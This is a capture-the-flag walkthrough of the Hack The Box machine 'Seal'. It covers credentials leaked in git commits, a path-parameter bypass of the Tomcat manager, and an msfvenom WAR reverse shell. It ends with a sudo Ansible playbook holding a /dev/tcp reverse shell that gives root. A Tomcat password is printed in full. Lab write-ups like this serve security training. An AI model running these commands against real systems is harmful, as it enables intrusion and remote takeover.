# [Seal](https://app.hackthebox.com/machines/seal)

```bash
nmap -p- --min-rate 10000 10.10.10.250 -Pn
```

![Alt text](img/image.png)

After detection of open ports (22,443,8080), we can do greater nmap scan.

```bash
nmap -A -sC -sV -p22,443,8080 10.10.10.250
```

![Alt text](img/image-7.png)


While I browse the application, it redirects into 'seal.htb' , that's why I add this into '/etc/hosts' file.

![Alt text](img/image-1.png)


Let's access application on port (8080), that's Gitbucket.

![Alt text](img/image-2.png)


I create an account and try to enumerate for finding sensitive credentials.

Dr4ks:Dr4ks


I can see `seal_market`'s repository is here.

![Alt text](img/image-3.png)


I find sensitive credentials from latest commits.

![Alt text](img/image-4.png)


tomcat:42MrHBf*z8{Z%


While I want to access Tomcat manager via browsing `/manager/html`, nginx blocks this action, to bypass this, I add `;`(semicolon).

![Alt text](img/image-5.png)


After bypass and successful authentication, I see Tomcat manager section.
`url=> /manager;/html`

![Alt text](img/image-6.png)


To get reverse shelll, I need to upload malicious `.war` file, let's create this by using `msfvenom` command.

```bash
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.16.6 lport=1337 -f war -o dr4ks.war
```

![Alt text](img/image-8.png)


There are a lot of erros comes about uploading, we need to add upload processing like below.
`URL=>  /manager/.;/html` should be.

![Alt text](img/image-9.png)


While clicking to my `dr4ks` endpoint, I got reverse shell from port (1337).

![Alt text](img/image-10.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-11.png)


While enumeration, I found two backup files (zipped) on location '/opt/backups/archives'.

Let's get one of them.

1.First, open http server via python.
```bash
python3 -m http.server --bind 10.10.10.250 3169
```

![Alt text](img/image-12.png)

2.Then grab files by visiting URL.

![Alt text](img/image-13.png)


These backup files are generated by `Ansible`, so that they have information from generated (are the same stuff)


I also know that one writeable folder `./uploads`, let's create link from luis folder via `ln` command.

```bash
ln -s /home/luis/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/
```


After this, playbooks works also our link worked.

![Alt text](img/image-14.png)


Let's grab this big data.

I extract all data from here like below.
```bash
gunzip -d .gz file
tar -xvf extracted file
```

Here's private key (id_rsa) file, I change privileges of this and connect into machine.

![Alt text](img/image-15.png)


```bash
chmod 600 id_rsa
ssh -i id_rsa luis@10.10.10.250
```

user.txt

![Alt text](img/image-16.png)


While I doing `sudo -l` command for privilege escalation, it says playbook is privileged action for luis user.

![Alt text](img/image-17.png)


I will exploit by creating this playbook .yaml file.

```yaml
- hosts: localhost
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/10.10.16.6/2024 0>&1'
```

Then run this playbook file.

```bash
sudo ansible-playbook dr4ks.yml 
```

![Alt text](img/image-18.png)


I got reverse shell from port (2024).

root.txt

![Alt text](img/image-19.png)
